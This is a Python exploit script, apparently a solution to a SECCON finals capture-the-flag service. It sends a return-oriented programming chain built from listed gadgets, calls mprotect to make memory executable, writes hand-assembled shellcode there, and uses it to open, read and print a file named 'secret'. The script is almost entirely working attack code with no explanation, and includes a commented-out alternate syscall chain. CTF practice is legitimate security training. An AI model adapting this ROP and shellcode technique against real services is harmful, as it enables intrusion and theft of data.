import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def send_msg(f, _str):
    f.write(p(len(_str)))
    f.write(_str)


#host = '3.finals.seccon.jp'
host = '192.168.165.134'
port = 20000

material_base = 0x10000000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

'''
.text:0002E33B                 pop     ecx
.text:0002E33C                 pop     edx
.text:0002E33D                 retn
'''

'''
.text:000EFFDF                 pop     edx
.text:000EFFE0                 pop     ecx
.text:000EFFE1                 pop     eax
.text:000EFFE2                 retn
.text:000EFFE2 mcount          endp
'''

'''
.text:000EC351                 int     80h             ; LINUX -
.text:000EC353                 pop     ebp
.text:000EC354                 pop     edi
.text:000EC355                 pop     esi
.text:000EC356                 pop     ebx
.text:000EC357                 retn
.text:000EC357 sub_EC330       endp
'''

'''
.text:0004D1B2                 mov     [edx], eax
.text:0004D1B4
.text:0004D1B4 loc_4D1B4:                              ; CODE XREF: printf_size_info+6j
.text:0004D1B4                 mov     eax, 1
.text:0004D1B9                 retn
.text:0004D1B9 printf_size_info endp
'''

dca_ret = 0x100EFFDF
a_ret = 0x100EFFE1
b_ret = 0x100EC356
d_ret = 0x1002E33C
int80 = 0x100EC351

write_val = 0x1004D1B2
syscall_mprotect = 125
syscall_read = 3
syscall_write = 4
syscall_open = 5

cc_addr = 0x1004d32c

buf_addr = 0x101a8700

# secret

rop3 = p(0x100F37DF) # dca_ret
rop3 += p(0x7) # edx type
rop3 += p(0x1a4000) # ecx len
rop3 += p(syscall_mprotect) # eax: 125
rop3 += p(0x100f66bb) # b_ret
rop3 += p(0x10000000) # ebx
rop3 += p(0x100ef791) # int 80
rop3 += p(0x41414141)
rop3 += p(0x41414141)
rop3 += p(0x41414141)
rop3 += p(0x10000000) # ebx

#rop3 += p(0xffffffff)

rop3 += p(0x100fd53b) # 
rop3 += p(0x10000000) # addr: edx
rop3 += p(0x1012b6a6) # 
rop3 += '\x83\xc3\x04\x58' # val: eax
rop3 += p(0x1004cac2)
rop3 += p(0x100fd53b) # 
rop3 += p(0x10000004) # addr: edx
rop3 += p(0x1012b6a6) # 
rop3 += '\x89\x03\xc3\x90' # val: eax
rop3 += p(0x1004cac2)

rop3 += p(0x100f66bb) # b_ret
rop3 += p(0x10000004) # +4 
rop3 += p(0x10000000) 
rop3 += '\x6a\x05\x58\x99'
rop3 += p(0x10000000) 
rop3 += '\x68\x65\x74\x00'
rop3 += p(0x10000000) 
rop3 += '\x00\x68\x73\x65'
rop3 += p(0x10000000) 
rop3 += '\x63\x72\x89\xe3'
rop3 += p(0x10000000) 
rop3 += '\x89\xd1\xcd\x80'
rop3 += p(0x10000000) 
rop3 += '\x89\xc3\x89\xe1'
rop3 += p(0x10000000) 
rop3 += '\xb2\x80\xb0\x03'
rop3 += p(0x10000000) 
rop3 += '\xcd\x80\x89\xc2'
rop3 += p(0x10000000) 
rop3 += '\x89\xe1\xb3\x01'
rop3 += p(0x10000000) 
rop3 += '\xb0\x04\xcd\x80'
rop3 += p(0x10000008)



'''
rop3 += p(0x100fd53b) # 
rop3 += p(0x10000008) # addr: edx
rop3 += p(0x1012b6a6) # 
rop3 += '\xcd\x80\x5b\xc3' # val: eax
rop3 += p(0x1004cac2)
rop3 += p(0x100F37DF)
rop3 += p(0x0) # edx
rop3 += p(0x0) # ecx
rop3 += p(syscall_open) # eax open
rop3 += p(0x10000008)
rop3 += p(0x0) # ebx
rop3 += p(0x100F37DF)
rop3 += p(1024) # edx
rop3 += p(0x101a3d00) # ecx
rop3 += p(syscall_read) # eax read
rop3 += p(0x10000008)
rop3 += p(0x1) # ebx
rop3 += p(0x100F37DF)
rop3 += p(128) # edx
rop3 += p(0x101a3d00) # ecx
rop3 += p(syscall_write) # eax write
rop3 += p(0x10000008)
'''

raw_input('wait')

send_msg(f, 'a' * 32)
send_msg(f, rop3)

print f.read(1024)
print f.read(1024)
print f.read(1024)

'''
t = telnetlib.Telnet()
t.sock = s
t.interact()
'''